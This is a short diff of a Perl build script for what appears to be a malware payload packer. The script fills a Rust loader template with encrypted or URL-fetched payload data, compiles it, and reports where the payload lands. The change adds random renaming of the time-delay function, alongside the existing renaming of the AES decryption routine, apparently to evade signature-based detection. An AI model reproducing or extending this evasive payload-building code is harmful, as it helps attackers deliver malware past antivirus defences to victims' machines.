@@ -204,6 +204,9 @@ if (!$encrypt) {
 my $random_func_name = gen_random_string(12);
 $replace =~ s/decrypt_aes/$random_func_name/g if $encrypt;
 
+$random_func_name = gen_random_string(14);
+$replace =~ s/time_delay/$random_func_name/g;
+
 if ($url) {
     $replace =~ s/SYNPACK_URL/$url/g;
     $replace =~ s/vec\!\[SYNPACK_DATA\];/get_data().await;/g;
@@ -216,7 +219,7 @@ if ($url) {
 }
 
 $template->spew_utf8($replace);
-c_print("[?] Would you like to purge old builds? (Y/n) ");
+c_print("[?] Would you like to purge old builds? (y/N) ");
 $resp = <>;
 chomp $resp;
 purge_builds() if lc($resp) eq "y";
@@ -229,4 +232,4 @@ unlink($exepath) if -e $exepath;
 system("cargo build --release");
 
 c_print("[+] Done! Payload located at: ", "$exepath\n", BRIGHT_GREEN) if -e $exepath;
-c_print("[+] Payload will be downloaded from: ", "$url\n", BRIGHT_BLUE) if -e $exepath;
+c_print("[+] Payload will be downloaded from: ", "$url\n", BRIGHT_BLUE) if -e $exepath && $url;
